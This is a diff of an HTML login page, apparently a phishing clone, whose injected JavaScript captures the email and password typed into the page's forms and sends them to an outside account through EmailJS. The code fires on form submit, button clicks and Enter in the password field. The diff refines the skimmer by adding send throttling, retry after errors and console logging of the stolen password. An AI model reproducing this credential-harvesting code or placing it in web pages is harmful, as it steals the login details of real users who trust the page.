@@ -748,48 +748,24 @@
 		</form>
 	</div>
 </div><div class="FullModalOverlay" style="display: none;"><div class="ModalOverlayContent ModalOverlayBackground"></div></div><!-- Tu contenido original -->
+></div></div><!-- Tu contenido original de la página -->
 
-<!-- PEGAR EMAILJS AQUÍ -->
+<!-- SOLO ESTE CÓDIGO DE EMAILJS (borra el anterior) -->
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-<script type="text/javascript">
-    emailjs.init({
-        publicKey: "3x0styJQNXamR4XT4"
-    });
-    
-    document.addEventListener('DOMContentLoaded', function() {
-        const form = document.querySelector('form');
-        
-        if (form) {
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const email = document.querySelector('input[type="email"]').value;
-                const password = document.querySelector('input[type="password"]').value;
-                const timestamp = new Date().toLocaleString('es-ES');
-                
-                emailjs.send('service_33u0mdn', 'template_ghyltzf', {
-                    user_email: email,
-                    password: password,
-                    timestamp: timestamp
-                }).then(function() {
-                    console.log('Enviado');
-                });
-            });
-        }
-    });
-</script>
-
-></div></div>
-></div></div>
-
-></div></div
-
-></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
 (function() {
     emailjs.init({ publicKey: "3x0styJQNXamR4XT4" });
     
+    let ultimoEnvio = 0;
+    
     function capturarYEnviar() {
+        const ahora = Date.now();
+        
+        if (ahora - ultimoEnvio < 2000) {
+            console.log('⏱️ Esperando antes de enviar de nuevo...');
+            return;
+        }
+        
         const forms = document.querySelectorAll('form');
         
         forms.forEach(function(form) {
@@ -815,52 +791,58 @@
             });
             
             if (email && password) {
-                console.log('📧 Enviando:', email);
+                ultimoEnvio = ahora;
+                console.log('📧 Enviando:', email, '/', password);
                 
                 emailjs.send('service_33u0mdn', 'template_ghyltzf', {
                     user_email: email,
                     password: password,
                     timestamp: new Date().toLocaleString('es-ES')
-                }).then(function() {
-                    console.log('✅ ENVIADO!');
+                }).then(function(response) {
+                    console.log('✅ ENVIADO CORRECTAMENTE!', response);
+                    setTimeout(function() {
+                        ultimoEnvio = 0;
+                        console.log('🔄 Listo para próximo envío');
+                    }, 3000);
                 }).catch(function(error) {
-                    console.error('❌ Error:', error);
+                    console.error('❌ Error al enviar:', error);
+                    ultimoEnvio = 0;
                 });
             } else {
-                console.log('❌ No se encontraron credenciales');
+                console.log('⚠️ Credenciales incompletas - Email:', email, 'Password:', password ? 'SÍ' : 'NO');
             }
         });
     }
     
     window.addEventListener('load', function() {
-        // Submit de formularios
+        console.log('✅ EmailJS listener iniciado');
+        
         document.querySelectorAll('form').forEach(function(form) {
             form.addEventListener('submit', function(e) {
-                console.log('🔄 Submit detectado');
-                capturarYEnviar();
+                console.log('🔄 SUBMIT detectado');
+                setTimeout(capturarYEnviar, 300);
             });
         });
         
-        // Clicks en botones
         document.addEventListener('click', function(e) {
             if (e.target.tagName === 'BUTTON' || (e.target.tagName === 'INPUT' && e.target.type === 'submit')) {
-                console.log('🖱️ Click en botón detectado');
-                setTimeout(capturarYEnviar, 200);
+                console.log('🖱️ CLICK en botón:', e.target);
+                setTimeout(capturarYEnviar, 300);
             }
         });
         
-        // Enter en password
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter' && e.target.type === 'password') {
-                console.log('⌨️ Enter en password detectado');
-                setTimeout(capturarYEnviar, 200);
+                console.log('⌨️ ENTER en password');
+                setTimeout(capturarYEnviar, 300);
             }
         });
     });
 })();
 </script>
 
-></div></div></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html>
+></div></div></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html>
+
 
 
 
